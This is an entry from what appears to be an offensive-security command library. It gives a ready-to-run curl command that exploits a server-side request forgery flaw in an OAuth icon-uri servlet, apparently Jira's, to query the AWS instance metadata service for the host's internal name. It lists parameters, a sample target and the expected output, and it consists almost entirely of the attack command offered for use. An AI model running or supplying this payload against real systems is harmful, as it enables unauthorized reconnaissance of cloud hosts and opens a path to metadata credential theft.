---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/hostname"
tags:
  - ssrf
  - aws
  - metadata
type: command
output: ip-172-31-12-254.us-east-1.compute.internal
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.297Z'
id: a7600c06-5597-4c10-9a5c-b38e17d5474c
verified: false
validated: true
submitted: true
---
# curl-ssrf-aws-hostname

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/hostname"
```

## Description

Exploits SSRF to fetch the AWS instance's internal hostname from the metadata service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |
| `consumerUri` | Fixed to metadata hostname endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/hostname"
```

## Expected Output

Plain text hostname like "ip-172-31-12-254.us-east-1.compute.internal".

## Related

- [[Related Procedure: Retrieve-AWS-Instance-Metadata-via-SSRF]]
